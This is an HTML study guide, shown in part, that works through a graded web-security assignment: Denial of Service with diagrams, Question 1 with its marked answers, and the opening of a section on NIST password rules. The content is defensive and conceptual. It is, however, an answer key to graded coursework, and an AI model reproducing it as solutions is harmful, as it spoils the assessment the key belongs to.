@@ -1,0 +1,2173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>Week 12 - Graded Assignment - Web Security and Privacy - Illustrated Solutions</title>
+<style>
+  @page { size: A4; margin: 15mm 13mm 15mm 13mm; }
+
+  :root{
+    --blue:#1b4f9c; --blue-l:#e8f0fb; --blue-d:#0f2f61;
+    --orange:#d9480f; --orange-l:#fff1e6;
+    --green:#1f7a3a; --green-l:#e9f7ee;
+    --red:#b52020; --red-l:#fdecec;
+    --purple:#5b3ec8; --purple-l:#f0ecfd;
+    --grey:#5a6472; --line:#d5dae2; --ink:#1d2430; --soft:#f7f9fc;
+  }
+
+  *{ box-sizing:border-box; }
+  body{
+    font-family:'Noto Sans', Arial, sans-serif;
+    color:var(--ink); font-size:10.6pt; line-height:1.62;
+    margin:0; padding:0; -webkit-print-color-adjust:exact; print-color-adjust:exact;
+  }
+  p{ margin:7px 0; }
+  b,strong{ color:var(--blue-d); }
+  ul,ol{ margin:7px 0 7px 0; padding-left:20px; }
+  li{ margin:4px 0; }
+  small{ font-size:9pt; color:var(--grey); }
+
+  h1.part{
+    break-before:page; page-break-before:always;
+    font-size:20pt; line-height:1.25; margin:0 0 4px 0; color:#fff;
+    background:var(--blue); padding:12px 16px; border-radius:8px;
+  }
+  h1.part .kicker{ display:block; font-size:9.5pt; letter-spacing:2px;
+    text-transform:uppercase; opacity:.85; font-weight:600; }
+  h1.nobreak{ break-before:auto; page-break-before:auto; }
+  h2{ font-size:14pt; margin:20px 0 6px; color:var(--blue-d);
+      border-bottom:2.5px solid var(--blue-l); padding-bottom:4px; break-after:avoid; }
+  h3{ font-size:11.6pt; margin:14px 0 4px; color:var(--orange); break-after:avoid; }
+  h4{ font-size:10.6pt; margin:10px 0 2px; color:var(--blue-d); break-after:avoid; }
+
+  .card, .note, .warn, .key, .ans, .qbox, .analogy, .trap, .kid{
+    break-inside:avoid; page-break-inside:avoid;
+    border-radius:8px; padding:10px 13px; margin:11px 0;
+  }
+  .card{ background:var(--soft); border:1px solid var(--line); }
+  .note{ background:var(--blue-l); border-left:5px solid var(--blue); }
+  .analogy{ background:#fffbe8; border-left:5px solid #e0a800; }
+  .warn{ background:var(--orange-l); border-left:5px solid var(--orange); }
+  .trap{ background:var(--red-l); border-left:5px solid var(--red); }
+  .key{ background:var(--purple-l); border-left:5px solid var(--purple); }
+  .kid{ background:#eefaf4; border:1.5px dashed var(--green); }
+  .ans{ background:var(--green-l); border:2.5px solid var(--green); }
+  .boxtitle{ font-weight:700; font-size:10.2pt; display:block; margin-bottom:3px;
+             letter-spacing:.3px; text-transform:uppercase; }
+  .note .boxtitle{ color:var(--blue); }
+  .analogy .boxtitle{ color:#a97800; }
+  .warn .boxtitle{ color:var(--orange); }
+  .trap .boxtitle{ color:var(--red); }
+  .key .boxtitle{ color:var(--purple); }
+  .kid .boxtitle{ color:var(--green); }
+  .ans .boxtitle{ color:var(--green); font-size:11pt; }
+  .ans .big{ font-size:15pt; font-weight:800; color:var(--green); }
+
+  .qhead{
+    background:var(--blue-d); color:#fff; border-radius:8px 8px 0 0;
+    padding:9px 14px; font-weight:700; font-size:12pt; margin-top:16px;
+    break-after:avoid; page-break-after:avoid;
+  }
+  .qhead .mark{ float:right; font-weight:600; font-size:9.5pt; opacity:.9; }
+  .qbody{
+    border:1.5px solid var(--blue-d); border-top:none; border-radius:0 0 8px 8px;
+    padding:11px 14px; margin-bottom:6px; background:#fff;
+    break-inside:avoid; page-break-inside:avoid;
+  }
+  .qtext{ font-weight:600; font-size:11pt; color:var(--blue-d); margin:0 0 7px; }
+  .opts{ list-style:none; padding:0; margin:0; }
+  .opts li{
+    border:1px solid var(--line); border-radius:6px; padding:5px 9px; margin:4px 0;
+    background:#fcfdff;
+  }
+  .opts li .lab{ font-weight:700; color:var(--blue); margin-right:6px; }
+  .opts li.right{ background:var(--green-l); border-color:var(--green); }
+  .opts li.wrong{ background:#fbfbfc; }
+
+  pre{
+    background:#1e2430; color:#e6e9ef; border-radius:8px; padding:11px 13px;
+    font-family:'Noto Sans Mono','Noto Sans',monospace; font-size:8.8pt; line-height:1.5;
+    overflow:visible; white-space:pre-wrap; margin:9px 0;
+    break-inside:avoid; page-break-inside:avoid;
+  }
+  pre.light{ background:#f3f5f9; color:#22303f; border:1px solid var(--line); }
+  code{ background:#eef1f6; border-radius:4px; padding:1px 5px; font-size:9.4pt;
+        font-family:'Noto Sans Mono','Noto Sans',monospace; color:#0f2f61; }
+  .kw{ color:#c792ea; } .st{ color:#ffcb6b; } .fn{ color:#82aaff; }
+  .nu{ color:#f78c6c; } .cm{ color:#8b98ad; font-style:italic; } .tg{ color:#7fd1b9; }
+
+  table{ width:100%; border-collapse:collapse; margin:10px 0; font-size:9.6pt;
+         break-inside:avoid; page-break-inside:avoid; }
+  table.flow{ break-inside:auto; page-break-inside:auto; }
+  table.flow tr{ break-inside:avoid; page-break-inside:avoid; }
+  th{ background:var(--blue); color:#fff; text-align:left; padding:6px 8px; font-size:9.4pt; }
+  td{ border:1px solid var(--line); padding:5px 8px; vertical-align:top; }
+  tr:nth-child(even) td{ background:#fafbfd; }
+  td.c, th.c{ text-align:center; }
+
+  .pill{ display:inline-block; padding:1px 8px; border-radius:11px; font-size:8.6pt;
+         font-weight:700; letter-spacing:.4px; }
+  .pill.t{ background:var(--green-l); color:var(--green); border:1px solid var(--green); }
+  .pill.f{ background:var(--red-l); color:var(--red); border:1px solid var(--red); }
+
+  figure{ margin:13px 0; break-inside:avoid; page-break-inside:avoid; text-align:center; }
+  figure svg{ width:100%; height:auto; }
+  figcaption{ font-size:9pt; color:var(--grey); margin-top:5px; font-style:italic; }
+  .fignum{ font-weight:700; color:var(--blue); font-style:normal; }
+
+  .step{ border-left:3px solid var(--blue-l); padding:2px 0 2px 13px; margin:12px 0;
+         break-inside:avoid; }
+  .step .n{ display:inline-block; background:var(--blue); color:#fff; font-weight:700;
+            border-radius:50%; width:21px; height:21px; text-align:center;
+            line-height:21px; font-size:9.4pt; margin-right:7px; }
+  .step .st-t{ font-weight:700; color:var(--blue-d); font-size:10.8pt; }
+
+  .cover{ height:262mm; display:flex; flex-direction:column; justify-content:center;
+          text-align:center; break-after:page; page-break-after:always; }
+  .cover .t1{ font-size:15pt; letter-spacing:4px; color:var(--orange); font-weight:700;
+              text-transform:uppercase; }
+  .cover .t2{ font-size:31pt; font-weight:800; color:var(--blue-d); line-height:1.15;
+              margin:8px 0; }
+  .cover .t3{ font-size:12.5pt; color:var(--grey); margin-bottom:22px; }
+  .cover .band{ background:var(--blue); color:#fff; padding:14px; border-radius:10px;
+                font-size:11.5pt; margin:0 8mm; }
+  .two{ display:flex; gap:11px; } .two > *{ flex:1; margin-top:0; }
+</style>
+</head>
+<body>
+
+<!-- ============================== COVER ============================== -->
+<div class="cover">
+  <div class="t1">Modern Application Development II</div>
+  <div class="t2">Week 12 &ndash; Graded Assignment<br/>Web Security and Privacy</div>
+  <div class="t3">DoS &bull; NIST passwords &bull; Same-origin &amp; CORS &bull; fetch API
+    &bull; XSS &bull; CSRF &bull; Privacy &amp; data leaks</div>
+
+  <figure>
+    <svg viewBox="0 0 660 260" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <marker id="cv1" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+          <path d="M0,0 L7,3.2 L0,6.4 z" fill="#b52020"/></marker>
+        <marker id="cv2" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+          <path d="M0,0 L7,3.2 L0,6.4 z" fill="#1f7a3a"/></marker>
+      </defs>
+      <text x="330" y="18" font-size="13" font-weight="800" fill="#0f2f61" text-anchor="middle">Four attacks, and the shield that stops each one</text>
+
+      <!-- attacks column -->
+      <text x="86" y="42" font-size="10.4" font-weight="800" fill="#b52020" text-anchor="middle">THE ATTACK</text>
+      <g font-size="8.6">
+        <rect x="14" y="52" width="144" height="38" rx="7" fill="#fdecec" stroke="#b52020" stroke-width="2"/>
+        <text x="86" y="68" font-weight="800" fill="#b52020" text-anchor="middle">DoS</text>
+        <text x="86" y="82" fill="#22303f" text-anchor="middle">flood it until it dies</text>
+
+        <rect x="14" y="98" width="144" height="38" rx="7" fill="#fdecec" stroke="#b52020" stroke-width="2"/>
+        <text x="86" y="114" font-weight="800" fill="#b52020" text-anchor="middle">STOLEN PASSWORDS</text>
+        <text x="86" y="128" fill="#22303f" text-anchor="middle">guess or crack the login</text>
+
+        <rect x="14" y="144" width="144" height="38" rx="7" fill="#fdecec" stroke="#b52020" stroke-width="2"/>
+        <text x="86" y="160" font-weight="800" fill="#b52020" text-anchor="middle">XSS</text>
+        <text x="86" y="174" fill="#22303f" text-anchor="middle">inject a script</text>
+
+        <rect x="14" y="190" width="144" height="38" rx="7" fill="#fdecec" stroke="#b52020" stroke-width="2"/>
+        <text x="86" y="206" font-weight="800" fill="#b52020" text-anchor="middle">CSRF</text>
+        <text x="86" y="220" fill="#22303f" text-anchor="middle">forge a request</text>
+      </g>
+
+      <!-- arrows -->
+      <path d="M164 71 H228" stroke="#b52020" stroke-width="2" marker-end="url(#cv1)"/>
+      <path d="M164 117 H228" stroke="#b52020" stroke-width="2" marker-end="url(#cv1)"/>
+      <path d="M164 163 H228" stroke="#b52020" stroke-width="2" marker-end="url(#cv1)"/>
+      <path d="M164 209 H228" stroke="#b52020" stroke-width="2" marker-end="url(#cv1)"/>
+
+      <!-- the app -->
+      <rect x="234" y="52" width="118" height="176" rx="9" fill="#e8f0fb" stroke="#1b4f9c" stroke-width="2.5"/>
+      <text x="293" y="128" font-size="11.5" font-weight="800" fill="#1b4f9c" text-anchor="middle">YOUR</text>
+      <text x="293" y="146" font-size="11.5" font-weight="800" fill="#1b4f9c" text-anchor="middle">WEB APP</text>
+      <text x="293" y="170" font-size="8.6" fill="#5a6472" text-anchor="middle">and its users' data</text>
+
+      <path d="M358 71 H422" stroke="#1f7a3a" stroke-width="2" marker-end="url(#cv2)"/>
+      <path d="M358 117 H422" stroke="#1f7a3a" stroke-width="2" marker-end="url(#cv2)"/>
+      <path d="M358 163 H422" stroke="#1f7a3a" stroke-width="2" marker-end="url(#cv2)"/>
+      <path d="M358 209 H422" stroke="#1f7a3a" stroke-width="2" marker-end="url(#cv2)"/>
+
+      <!-- defences -->
+      <text x="546" y="42" font-size="10.4" font-weight="800" fill="#1f7a3a" text-anchor="middle">THE DEFENCE</text>
+      <g font-size="8.6">
+        <rect x="428" y="52" width="218" height="38" rx="7" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2"/>
+        <text x="537" y="68" font-weight="800" fill="#1f7a3a" text-anchor="middle">rate limits, filtering, scaling</text>
+        <text x="537" y="82" fill="#22303f" text-anchor="middle">spot the flood and drop it</text>
+
+        <rect x="428" y="98" width="218" height="38" rx="7" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2"/>
+        <text x="537" y="114" font-weight="800" fill="#1f7a3a" text-anchor="middle">salted hashing + NIST rules</text>
+        <text x="537" y="128" fill="#22303f" text-anchor="middle">long passwords, throttled logins</text>
+
+        <rect x="428" y="144" width="218" height="38" rx="7" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2"/>
+        <text x="537" y="160" font-weight="800" fill="#1f7a3a" text-anchor="middle">validate and escape input</text>
+        <text x="537" y="174" fill="#22303f" text-anchor="middle">never trust what users send</text>
+
+        <rect x="428" y="190" width="218" height="38" rx="7" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2"/>
+        <text x="537" y="206" font-weight="800" fill="#1f7a3a" text-anchor="middle">CSRF token + CORS rules</text>
+        <text x="537" y="220" fill="#22303f" text-anchor="middle">prove the request is really yours</text>
+      </g>
+
+      <rect x="14" y="238" width="632" height="18" rx="9" fill="#f0ecfd" stroke="#5b3ec8" stroke-width="1.6"/>
+      <text x="330" y="251" font-size="9.6" font-weight="800" fill="#5b3ec8" text-anchor="middle">Running underneath all of it: the difference between SECURITY and PRIVACY.</text>
+    </svg>
+  </figure>
+
+  <div class="band">
+    Written for a complete beginner. Start at Part 1 and read straight through.
+    Every idea gets a picture and an everyday story before any code appears.
+  </div>
+</div>
+
+<!-- ============================== HOW TO USE ============================== -->
+<h1 class="part nobreak"><span class="kicker">Read this first</span>How to use this book</h1>
+
+<p>This document does <b>two</b> jobs at once:</p>
+<ol>
+  <li><b>It teaches the subject from zero.</b> Parts 1 to 8 build the knowledge brick by brick,
+      with pictures and everyday stories.</li>
+  <li><b>It solves all 10 questions</b>, showing exactly how a marker expects you to reason.</li>
+</ol>
+
+<div class="ans">
+  <span class="boxtitle">Good news about your attempt</span>
+  Your screenshots show <b>"Flag for review"</b> and no green correctness banners, so these are
+  the options you had <i>selected</i>, not confirmed results. Every answer here was therefore
+  worked out independently and checked against the <b>NIST SP 800-63B</b> guidelines and the
+  <b>MDN web documentation</b> for fetch, CORS and the same-origin policy.
+  <br/><br/>
+  The result: <b>all ten of your selections are correct.</b> There is nothing to change.
+  This book exists to make sure you know <i>why</i>, because security questions get reworded
+  heavily in the end term.
+</div>
+
+<h2>Map of the book</h2>
+<table>
+  <tr><th style="width:88px">Part</th><th>What you learn</th><th style="width:112px">Questions</th></tr>
+  <tr><td><b>Part 1</b></td><td>Denial of Service: drowning a server in requests</td><td class="c"><b>Q1</b></td></tr>
+  <tr><td><b>Part 2</b></td><td>Passwords done properly, and what NIST actually says</td><td class="c"><b>Q2</b></td></tr>
+  <tr><td><b>Part 3</b></td><td>Origins, the same-origin policy, and CORS</td><td class="c"><b>Q10</b></td></tr>
+  <tr><td><b>Part 4</b></td><td>The fetch API: methods, modes and credentials</td><td class="c"><b>Q4</b></td></tr>
+  <tr><td><b>Part 5</b></td><td>XSS: injecting a script into someone else's page</td><td class="c"><b>Q5</b></td></tr>
+  <tr><td><b>Part 6</b></td><td>CSRF, and the token that stops it</td><td class="c"><b>Q6, Q7</b></td></tr>
+  <tr><td><b>Part 7</b></td><td>CORS and CSRF together, plus opaque requests</td><td class="c"><b>Q3</b></td></tr>
+  <tr><td><b>Part 8</b></td><td>Privacy vs security, and leaking data without giving it away</td><td class="c"><b>Q8, Q9</b></td></tr>
+  <tr><td><b>Part 9</b></td><td>Answer key, cheat sheet, practice questions, glossary</td><td class="c">revision</td></tr>
+</table>
+
+<h2>The boxes you will see</h2>
+<div class="analogy"><span class="boxtitle">Story box</span>
+  A real-life picture of the idea. Read this one first, always.</div>
+<div class="note"><span class="boxtitle">Definition box</span>
+  The proper technical wording, the one to write in an exam.</div>
+<div class="trap"><span class="boxtitle">Trap box</span>
+  The exact mistake that loses the mark. Learn these by heart.</div>
+<div class="ans"><span class="boxtitle">Answer box</span>
+  The final answer, with the option letters.</div>
+
+
+<!-- ============================== PART 1 ============================== -->
+<h1 class="part"><span class="kicker">Part 1 &bull; Question 1</span>Denial of Service</h1>
+
+<div class="analogy">
+  <span class="boxtitle">Story box &bull; the blocked shop door</span>
+  A small shop can serve about ten customers at a time. A rival hires <b>five hundred people</b>
+  to crowd into the doorway, all shouting questions, none of them buying anything.
+  <br/><br/>
+  The rival has not stolen anything. He has not broken the till or read the account books.
+  But <b>real customers cannot get in</b>, so the shop might as well be closed. The damage is
+  <b>unavailability</b>.
+  <br/><br/>
+  That is a <b>Denial of Service</b> attack. Notice what it is <i>not</i>: it is not about
+  breaking in.
+</div>
+
+<div class="note">
+  <span class="boxtitle">Definition box &bull; DoS</span>
+  A <b>Denial of Service (DoS)</b> attack aims to make a service <b>unavailable to its legitimate
+  users</b>. The usual method is to send a huge, continuous volume of requests so the server
+  exhausts its resources &ndash; connections, memory, CPU, bandwidth &ndash; and slows to a halt or
+  crashes.
+</div>
+
+<figure>
+  <svg viewBox="0 0 700 265" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <marker id="d1" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+        <path d="M0,0 L7,3.2 L0,6.4 z" fill="#1f7a3a"/></marker>
+      <marker id="d2" markerWidth="8" markerHeight="8" refX="6.5" refY="2.8" orient="auto">
+        <path d="M0,0 L6.5,2.8 L0,5.6 z" fill="#b52020"/></marker>
+    </defs>
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">Normal day, and a Denial of Service day</text>
+
+    <!-- normal -->
+    <rect x="8" y="28" width="336" height="230" rx="10" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2.5"/>
+    <text x="176" y="48" font-size="11.5" font-weight="800" fill="#1f7a3a" text-anchor="middle">NORMAL TRAFFIC</text>
+    <g font-size="8.4">
+      <circle cx="44" cy="86" r="11" fill="#fff" stroke="#1f7a3a" stroke-width="1.8"/>
+      <text x="44" y="89" fill="#1f7a3a" font-weight="700" text-anchor="middle">U1</text>
+      <circle cx="44" cy="126" r="11" fill="#fff" stroke="#1f7a3a" stroke-width="1.8"/>
+      <text x="44" y="129" fill="#1f7a3a" font-weight="700" text-anchor="middle">U2</text>
+      <circle cx="44" cy="166" r="11" fill="#fff" stroke="#1f7a3a" stroke-width="1.8"/>
+      <text x="44" y="169" fill="#1f7a3a" font-weight="700" text-anchor="middle">U3</text>
+      <path d="M58 90 L212 118" stroke="#1f7a3a" stroke-width="1.8" marker-end="url(#d1)"/>
+      <path d="M58 126 H212" stroke="#1f7a3a" stroke-width="1.8" marker-end="url(#d1)"/>
+      <path d="M58 162 L212 134" stroke="#1f7a3a" stroke-width="1.8" marker-end="url(#d1)"/>
+    </g>
+    <rect x="220" y="96" width="94" height="60" rx="8" fill="#fff" stroke="#1f7a3a" stroke-width="2.4"/>
+    <text x="267" y="120" font-size="9.4" font-weight="800" fill="#1f7a3a" text-anchor="middle">SERVER</text>
+    <text x="267" y="136" font-size="8.4" fill="#5a6472" text-anchor="middle">coping fine</text>
+    <text x="267" y="148" font-size="8.4" fill="#1f7a3a" font-weight="700" text-anchor="middle">10% busy</text>
+
+    <rect x="26" y="186" width="300" height="58" rx="7" fill="#fff" stroke="#1f7a3a"/>
+    <text x="176" y="204" font-size="9.4" font-weight="700" fill="#1f7a3a" text-anchor="middle">Everyone is served quickly.</text>
+    <text x="176" y="221" font-size="9" fill="#22303f" text-anchor="middle">The server has spare capacity for more</text>
+    <text x="176" y="235" font-size="9" fill="#22303f" text-anchor="middle">users if they turn up.</text>
+
+    <!-- dos -->
+    <rect x="356" y="28" width="336" height="230" rx="10" fill="#fdecec" stroke="#b52020" stroke-width="2.5"/>
+    <text x="524" y="48" font-size="11.5" font-weight="800" fill="#b52020" text-anchor="middle">DENIAL OF SERVICE</text>
+    <g stroke="#b52020" stroke-width="1.2" opacity=".8">
+      <path d="M400 64 L556 112" marker-end="url(#d2)"/>
+      <path d="M400 76 L556 116" marker-end="url(#d2)"/>
+      <path d="M400 88 L556 120" marker-end="url(#d2)"/>
+      <path d="M400 100 L556 124" marker-end="url(#d2)"/>
+      <path d="M400 112 L556 128" marker-end="url(#d2)"/>
+      <path d="M400 124 H556" marker-end="url(#d2)"/>
+      <path d="M400 136 L556 132" marker-end="url(#d2)"/>
+      <path d="M400 148 L556 136" marker-end="url(#d2)"/>
+      <path d="M400 160 L556 140" marker-end="url(#d2)"/>
+      <path d="M400 172 L556 144" marker-end="url(#d2)"/>
+    </g>
+    <text x="386" y="120" font-size="8.6" font-weight="800" fill="#b52020" text-anchor="end" transform="rotate(-90 386 120)">BULK REQUESTS</text>
+    <rect x="562" y="96" width="94" height="60" rx="8" fill="#b52020" stroke="#7d1414" stroke-width="2.4"/>
+    <text x="609" y="118" font-size="9.4" font-weight="800" fill="#fff" text-anchor="middle">SERVER</text>
+    <text x="609" y="133" font-size="8.4" fill="#fff" text-anchor="middle">overloaded</text>
+    <text x="609" y="146" font-size="8.6" font-weight="800" fill="#fff" text-anchor="middle">CRASHED</text>
+
+    <!-- blocked real user -->
+    <circle cx="396" cy="196" r="11" fill="#fff" stroke="#1f7a3a" stroke-width="1.8"/>
+    <text x="396" y="199" font-size="8.4" fill="#1f7a3a" font-weight="700" text-anchor="middle">U1</text>
+    <path d="M410 196 H470" stroke="#1f7a3a" stroke-width="1.8" stroke-dasharray="4 3" fill="none"/>
+    <line x1="474" y1="188" x2="490" y2="204" stroke="#b52020" stroke-width="3"/>
+    <line x1="490" y1="188" x2="474" y2="204" stroke="#b52020" stroke-width="3"/>
+    <text x="576" y="192" font-size="9" font-weight="800" fill="#b52020" text-anchor="middle">the REAL user</text>
+    <text x="576" y="205" font-size="9" font-weight="800" fill="#b52020" text-anchor="middle">is shut out</text>
+
+    <rect x="374" y="218" width="300" height="30" rx="7" fill="#fff" stroke="#b52020"/>
+    <text x="524" y="230" font-size="9.4" font-weight="700" fill="#b52020" text-anchor="middle">Nothing was stolen. The service simply</text>
+    <text x="524" y="243" font-size="9.4" font-weight="700" fill="#b52020" text-anchor="middle">stopped being available. That IS the attack.</text>
+  </svg>
+  <figcaption><span class="fignum">Figure 1.1</span> &ndash; DoS attacks <b>availability</b>, not secrecy. Nobody breaks in; everybody else is kept out.</figcaption>
+</figure>
+
+<h2>1.1 DoS and DDoS</h2>
+
+<figure>
+  <svg viewBox="0 0 700 175" xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <marker id="d3" markerWidth="8" markerHeight="8" refX="6.5" refY="2.8" orient="auto">
+        <path d="M0,0 L6.5,2.8 L0,5.6 z" fill="#b52020"/></marker>
+    </defs>
+    <rect x="8" y="24" width="336" height="144" rx="9" fill="#fff1e6" stroke="#d9480f" stroke-width="2.2"/>
+    <text x="176" y="44" font-size="11" font-weight="800" fill="#d9480f" text-anchor="middle">DoS &ndash; one attacker</text>
+    <rect x="34" y="80" width="60" height="34" rx="6" fill="#fff" stroke="#d9480f" stroke-width="2"/>
+    <text x="64" y="101" font-size="8.6" font-weight="700" fill="#d9480f" text-anchor="middle">attacker</text>
+    <g stroke="#b52020" stroke-width="1.4">
+      <path d="M100 90 H244" marker-end="url(#d3)"/>
+      <path d="M100 97 H244" marker-end="url(#d3)"/>
+      <path d="M100 104 H244" marker-end="url(#d3)"/>
+    </g>
+    <rect x="250" y="80" width="64" height="34" rx="6" fill="#d9480f"/>
+    <text x="282" y="101" font-size="8.6" font-weight="700" fill="#fff" text-anchor="middle">server</text>
+    <text x="176" y="140" font-size="9" fill="#22303f" text-anchor="middle">Easier to defend: block that one</text>
+    <text x="176" y="154" font-size="9" fill="#22303f" text-anchor="middle">source address and the flood stops.</text>
+
+    <rect x="356" y="24" width="336" height="144" rx="9" fill="#fdecec" stroke="#b52020" stroke-width="2.2"/>
+    <text x="524" y="44" font-size="11" font-weight="800" fill="#b52020" text-anchor="middle">DDoS &ndash; thousands of attackers</text>
+    <g font-size="7.6">
+      <rect x="374" y="60" width="34" height="18" rx="4" fill="#fff" stroke="#b52020" stroke-width="1.6"/>
+      <text x="391" y="73" fill="#b52020" font-weight="700" text-anchor="middle">bot</text>
+      <rect x="374" y="82" width="34" height="18" rx="4" fill="#fff" stroke="#b52020" stroke-width="1.6"/>
+      <text x="391" y="95" fill="#b52020" font-weight="700" text-anchor="middle">bot</text>
+      <rect x="374" y="104" width="34" height="18" rx="4" fill="#fff" stroke="#b52020" stroke-width="1.6"/>
+      <text x="391" y="117" fill="#b52020" font-weight="700" text-anchor="middle">bot</text>
+      <rect x="374" y="126" width="34" height="18" rx="4" fill="#fff" stroke="#b52020" stroke-width="1.6"/>
+      <text x="391" y="139" fill="#b52020" font-weight="700" text-anchor="middle">bot</text>
+    </g>
+    <text x="391" y="156" font-size="8" font-weight="700" fill="#b52020" text-anchor="middle">a "botnet"</text>
+    <g stroke="#b52020" stroke-width="1.3">
+      <path d="M414 69 L590 96" marker-end="url(#d3)"/>
+      <path d="M414 91 L590 100" marker-end="url(#d3)"/>
+      <path d="M414 113 L590 104" marker-end="url(#d3)"/>
+      <path d="M414 135 L590 108" marker-end="url(#d3)"/>
+    </g>
+    <rect x="596" y="84" width="64" height="34" rx="6" fill="#b52020"/>
+    <text x="628" y="105" font-size="8.6" font-weight="700" fill="#fff" text-anchor="middle">server</text>
+    <text x="524" y="140" font-size="9" fill="#22303f" text-anchor="middle">Much harder: traffic comes from</text>
+    <text x="524" y="154" font-size="9" fill="#22303f" text-anchor="middle">thousands of innocent-looking machines.</text>
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">One extra letter changes the difficulty completely</text>
+  </svg>
+  <figcaption><span class="fignum">Figure 1.2</span> &ndash; The extra <b>D</b> stands for <b>Distributed</b>: many machines attacking at once.</figcaption>
+</figure>
+
+<!-- ---------------------------- Q1 ---------------------------- -->
+<div class="qhead">Question 1 <span class="mark">1 mark &bull; select all that apply</span></div>
+<div class="qbody">
+  <p class="qtext">Which of the following statement(s) is/are correct regarding "Denial of Service" attack?</p>
+  <ul class="opts">
+    <li class="wrong"><span class="lab">A.</span> It is an attack that prevents hackers from gaining access to a system in a network.</li>
+    <li class="right"><span class="lab">B.</span> It is an attack that prevents users from accessing the expected services.</li>
+    <li class="right"><span class="lab">C.</span> The attack is usually done by sending continuous bulk requests to overload the server until it crashes.</li>
+    <li class="wrong"><span class="lab">D.</span> All of the above</li>
+  </ul>
+</div>
+
+<h3>Option-by-option reasoning</h3>
+<table>
+  <tr><th style="width:60px" class="c">Option</th><th style="width:64px" class="c">Verdict</th><th>Why</th></tr>
+  <tr><td class="c"><b>A</b></td><td class="c"><span class="pill f">FALSE</span></td>
+      <td>Read it slowly and it is nonsense: it describes something that <b>protects</b> a system
+      from hackers. An <b>attack</b> is never a protection. Also note who is denied &ndash;
+      the victims are <b>legitimate users</b>, not hackers. This option swaps the victim.</td></tr>
+  <tr><td class="c"><b>B</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>This is the definition, and the name says it: service is <b>denied</b> to the users who
+      should have had it.</td></tr>
+  <tr><td class="c"><b>C</b></td><td class="c"><span class="pill t">TRUE</span></td>
+      <td>The standard method: continuous bulk requests until resources are exhausted.
+      Note the honest word "usually" &ndash; there are other DoS methods, such as exploiting a bug
+      that crashes the server with a single malformed packet.</td></tr>
+  <tr><td class="c"><b>D</b></td><td class="c"><span class="pill f">FALSE</span></td>
+      <td>Requires A to be true. It is not.</td></tr>
+</table>
+
+<div class="ans">
+  <span class="boxtitle">Answer to Question 1</span>
+  <span class="big">B and C</span>
+  <br/><small>What the attack does, and how it is usually done. Matches your selection.</small>
+</div>
+
+<div class="trap">
+  <span class="boxtitle">Trap box &bull; the reversed-victim option</span>
+  Option A is built by taking a true-sounding security sentence and pointing it at the wrong
+  person. When you read any option about an attack, ask: <b>who gets hurt?</b> For DoS the answer
+  is always <i>the ordinary users</i>. Any option that says the attack blocks <i>hackers</i> has
+  the arrow backwards.
+</div>
+
+<!-- ============================== PART 2 ============================== -->
+<h1 class="part"><span class="kicker">Part 2 &bull; Question 2</span>Passwords, and what NIST actually says</h1>
+
+<p>Most of what people "know" about passwords is out of date. The modern reference is
+<b>NIST Special Publication 800-63B</b>, and it overturned several rules that older websites
+still enforce.</p>
+
+<h2>2.1 Length beats complexity</h2>
+
+<div class="analogy">
+  <span class="boxtitle">Story box &bull; the bicycle lock</span>
+  Two number locks. One has <b>4 wheels</b> but each wheel has letters, digits and symbols.
+  The other has <b>12 wheels</b> with digits only.
+  <br/><br/>
+  A thief trying every combination has far more work on the 12-wheel lock, even though each
+  individual wheel is simpler. <b>Adding wheels multiplies the work; making one wheel fancier
+  only adds a little.</b>
+  <br/><br/>
+  Passwords behave identically. <code>Xk#7q</code> looks impressive and is weak.
+  <code>correct horse battery staple</code> looks simple and is enormously stronger &ndash;
+  and you can actually remember it.
+</div>
+
+<figure>
+  <svg viewBox="0 0 700 240" xmlns="http://www.w3.org/2000/svg">
+    <text x="350" y="16" font-size="12.5" font-weight="800" fill="#0f2f61" text-anchor="middle">Which password is harder to crack?</text>
+
+    <!-- complex short -->
+    <rect x="8" y="28" width="336" height="130" rx="9" fill="#fdecec" stroke="#b52020" stroke-width="2.2"/>
+    <text x="176" y="48" font-size="10.6" font-weight="800" fill="#b52020" text-anchor="middle">SHORT but "complex"</text>
+    <rect x="66" y="58" width="220" height="28" rx="5" fill="#1e2430"/>
+    <text x="176" y="77" font-size="11" fill="#ffcb6b" font-weight="700" text-anchor="middle">Xk#7q!</text>
+    <text x="176" y="104" font-size="9" fill="#22303f" text-anchor="middle">6 characters, mixed symbols</text>
+    <text x="176" y="120" font-size="9" fill="#22303f" text-anchor="middle">hard for a HUMAN to remember</text>
+    <rect x="66" y="128" width="220" height="22" rx="11" fill="#b52020"/>
+    <text x="176" y="143" font-size="9" font-weight="800" fill="#fff" text-anchor="middle">easy for a COMPUTER to crack</text>
+
+    <!-- long simple -->
+    <rect x="356" y="28" width="336" height="130" rx="9" fill="#e9f7ee" stroke="#1f7a3a" stroke-width="2.2"/>
+    <text x="524" y="48" font-size="10.6" font-weight="800" fill="#1f7a3a" text-anchor="middle">LONG and simple</text>
+    <rect x="384" y="58" width="280" height="28" rx="5" fill="#1e2430"/>
+    <text x="524" y="77" font-size="10" fill="#7fd1b9" font-weight="700" text-anchor="middle">my dog eats yellow mangoes</text>
+    <text x="524" y="104" font-size="9" fill="#22303f" text-anchor="middle">26 characters, ordinary words</text>
+    <text x="524" y="120" font-size="9" fill="#22303f" text-anchor="middle">easy for a HUMAN to remember</text>
+    <rect x="384" y="128" width="280" height="22" rx="11" fill="#1f7a3a"/>
+    <text x="524" y="143" font-size="9" font-weight="800" fill="#fff" text-anchor="middle">vastly harder for a COMPUTER to crack</text>
+
+    <!-- explanation -->
+    <rect x="8" y="168" width="684" height="66" rx="9" fill="#fffbe8" stroke="#e0a800" stroke-width="2"/>
